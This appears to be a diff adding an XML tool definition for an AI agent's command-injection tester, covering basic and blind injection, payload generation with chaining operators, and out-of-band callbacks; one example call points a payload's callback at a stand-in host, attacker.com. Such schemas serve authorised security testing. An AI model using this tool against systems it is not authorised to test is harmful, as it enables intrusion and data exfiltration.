@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<tools>
+  <tool name="command_injection_tester">
+    <description>Test for OS command injection vulnerabilities in web applications.</description>
+    <details>Common Use Cases:
+      - Test basic command injection with output reflection
+      - Test blind command injection using timing attacks
+      - Generate command injection payloads
+      - Test specific endpoints for command injection
+      - Out-of-band (OOB) verification for blind injection</details>
+    <parameters>
+      <parameter name="action" type="string" required="true">
+        <description>The testing action to perform:
+          - test_basic: Test basic command injection with output
+          - test_blind: Test blind injection using timing
+          - generate_payload: Generate command injection payloads
+          - test_endpoint: Test specific endpoint with payload</description>
+      </parameter>
+      <parameter name="url" type="string" required="false">
+        <description>Target URL for testing. Required for test_basic, test_blind, test_endpoint actions.</description>
+      </parameter>
+      <parameter name="param_name" type="string" required="false">
+        <description>Parameter name to test (default: cmd)</description>
+      </parameter>
+      <parameter name="command" type="string" required="false">
+        <description>Command to execute (default: whoami)</description>
+      </parameter>
+      <parameter name="os_type" type="string" required="false">
+        <description>Operating system type: linux or windows (default: linux)</description>
+      </parameter>
+      <parameter name="callback_url" type="string" required="false">
+        <description>Callback URL for OOB (out-of-band) verification</description>
+      </parameter>
+      <parameter name="operator" type="string" required="false">
+        <description>Command chaining operator: ;, |, &amp;, etc. (default: ;)</description>
+      </parameter>
+      <parameter name="timeout" type="integer" required="false">
+        <description>Request timeout in seconds (default: 15)</description>
+      </parameter>
+    </parameters>
+    <returns type="Dict[str, Any]">
+      <description>Test results including vulnerability detection and payload effectiveness</description>
+    </returns>
+    <examples>
+      # Test basic command injection
+      <function=command_injection_tester>
+      <parameter=action>test_basic</parameter>
+      <parameter=url>https://example.com/exec</parameter>
+      <parameter=param_name>cmd</parameter>
+      </function>
+
+      # Test blind command injection
+      <function=command_injection_tester>
+      <parameter=action>test_blind</parameter>
+      <parameter=url>https://example.com/exec</parameter>
+      <parameter=os_type>linux</parameter>
+      </function>
+
+      # Generate payloads
+      <function=command_injection_tester>
+      <parameter=action>generate_payload</parameter>
+      <parameter=command>whoami</parameter>
+      <parameter=operator>;</parameter>
+      </function>
+
+      # Test endpoint with OOB callback
+      <function=command_injection_tester>
+      <parameter=action>generate_payload</parameter>
+      <parameter=command>id</parameter>
+      <parameter=callback_url>https://attacker.com/callback</parameter>
+      </function>
+    </examples>
+  </tool>
+</tools>
